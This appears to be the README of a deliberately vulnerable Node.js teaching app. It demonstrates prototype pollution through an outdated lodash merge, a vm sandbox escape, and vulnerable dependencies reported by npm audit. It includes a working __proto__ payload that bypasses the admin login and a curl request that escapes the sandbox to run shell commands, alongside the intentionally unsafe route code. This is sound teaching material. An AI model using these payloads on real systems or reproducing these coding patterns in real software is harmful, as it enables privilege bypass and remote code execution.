[中文版](/README_zh.md)
# Demonstration of classic nodejs vulnerability

This intentionally-vulnerable app demonstrate three classic vulnerabilities in nodejs:

- prototype pollution
- sandbox escape
- vulnerable third-party packages(which introduce the prototype pollution vulnerability)

## How to set up

using docker:

```
$ docker compose up
```

using local env:

```
$ npm i && npm start
```

Then access http://localhost:9999/

## Vulnerability Demonstration

### prototype pollution

```javascript
  app.post('/api/orders', validate(postOrderSchema), (req, res, next) => {
    const clientOrder = _.merge({}, req.body, { ipAddress: req.ip });

    const newObj = {};
    console.log('newObj.admin', newObj.admin);

    res.json({
      status: 'ok',
    });
  });
```

the third party package "lodash" is outdated and vulnerable to prototype pollution vulnerability in the `merge` function

normal request:

```bash
$ curl -H"content-type: application/json" -d @normal_order.json http://localhost:9999/api/orders

{"status":"ok"}
```

attacking request:

```bash
$ curl -H"content-type: application/json" -d @attack_order.json http://localhost:9999/api/orders

{"status":"ok"}
```

the `attack_order.json` contains the prototype pollution payload:

```json
{
  "__proto__": { "admin": true },
  "currency": "EUR",
  "email": "john.doe@mail.com"
}
```

it tries to pollute the `Object.prototype` and add an attribute `admin` to it, this will affect the route at `/api/login` defined below:

```javascript
  function login(username, password) {
    if (username == 'admin' && password == 'thisisaveryveryverylongpassword') {
      return { user: 'admin', admin: true };
    } else {
      return { user: 'guest' };
    }
  }

  const loginSchema = {
    body: Joi.object({
      username: Joi.string().required(),
      password: Joi.string().required(),
    }),
  };
  app.post('/api/login', validate(loginSchema), (req, res, next) => {
    user = login(req.body.username, req.body.password);
    if (user.admin) {
      res.json({
        secret: "this is a top secret",
      });
    } else {
      res.json({
        error: "not admin"
      });
    }
  });
```

only if user input the correct username and password for admin, `login` function will return an object with 'admin' set to true, otherwise, `login` function will return an object without admin attribute.



Before the attacker pollute the `Object.prototype`, it works normally:

```bash
$ curl -H"content-type: application/json" -d'{"username":"admin","password":"idontknowpassword"}' http://localhost:9999/api/login

{"error":"not admin"}

----------------

$ curl -H"content-type: application/json" -d'{"username":"admin","password":"thisisaveryveryverylongpassword"}' http://localhost:9999/api/login

{"secret":"this is a top secret"}
```

after attacker sends the attacking request and pollutes the `Object.prototype`, he can gain admin privilege without knowing the admin password:

```bash
$ curl -H"content-type: application/json" -d'{"username":"admin","password":"idontknowpassword"}' http://localhost:9999/api/login

{"secret":"this is a top secret"}
```

This is because in the `/api/login` route, it checks for `user.admin`, when admin attribute is not found, it will search up to `__proto__`, which is `Object.prototype` and found the polluted admin attribute

### sandbox escape

there is another route at `/api/calc`, which is meant for doing some simple math calculation:

```javascript
  const mathExp = {
    body: Joi.object({
      exp: Joi.string().required(),
    }),
  };
  app.post('/api/calc', validate(mathExp), (req, res, next) => {
    console.log(req.body.exp);
    ans = vm.runInNewContext(req.body.exp);

    res.json({
      ans: ans,
    });
  });
```

```bash
curl -H"content-type: application/json" -d'{"exp":"2+3*4"}' http://localhost:9999/api/calc

{"ans":14}
```

it's trying to evaluate the expression from the client using vm module, which is not safe, and can be bypassed and achieve remote code execution:

```bash
$ curl -H"content-type: application/json" -d $'{\"exp\":\"(e=> { return this.constructor.constructor(\'return process\')().mainModule.require(\'child_process\').execSync(\'id\').toString();})()\"}' http://localhost:9999/api/calc

{"ans":"uid=0(root) gid=0(root)\n"}
```

### vulnerable third-party packages

as shown in the prototype pollution vulnerability, the lodash package is outdated and vulnerable to prototype pollution, we can identify this issue using `npm audit` command:

```bash
$ npm audit
# npm audit report

lodash  <=4.17.20
Severity: critical
Regular Expression Denial of Service (ReDoS) in lodash - https://github.com/advisories/GHSA-x5rq-j2xg-h7qm
Prototype Pollution in lodash - https://github.com/advisories/GHSA-4xc9-xhrj-v574
Prototype Pollution in lodash - https://github.com/advisories/GHSA-fvqr-27wr-82fm
Prototype Pollution in lodash - https://github.com/advisories/GHSA-p6mc-m468-83gw
Command Injection in lodash - https://github.com/advisories/GHSA-35jh-r3h4-6jhm
Regular Expression Denial of Service (ReDoS) in lodash - https://github.com/advisories/GHSA-29mw-wpgm-hmr9
Prototype Pollution in lodash - https://github.com/advisories/GHSA-jf85-cpcp-j695
fix available via `npm audit fix --force`
Will install lodash@4.17.21, which is outside the stated dependency range
node_modules/express-validation/node_modules/lodash
node_modules/lodash

qs  6.7.0 - 6.7.2
Severity: high
qs vulnerable to Prototype Pollution - https://github.com/advisories/GHSA-hrpp-h998-j3pp
fix available via `npm audit fix`
node_modules/qs
  body-parser  1.19.0
  Depends on vulnerable versions of qs
  node_modules/body-parser
  express  4.17.0 - 4.17.1 || 5.0.0-alpha.1 - 5.0.0-alpha.8
  Depends on vulnerable versions of body-parser
  Depends on vulnerable versions of qs
  node_modules/express

4 vulnerabilities (3 high, 1 critical)

To address issues that do not require attention, run:
  npm audit fix

To address all issues, run:
  npm audit fix --force
```

you can then analyze the report and update the affected packages to fix the issue.
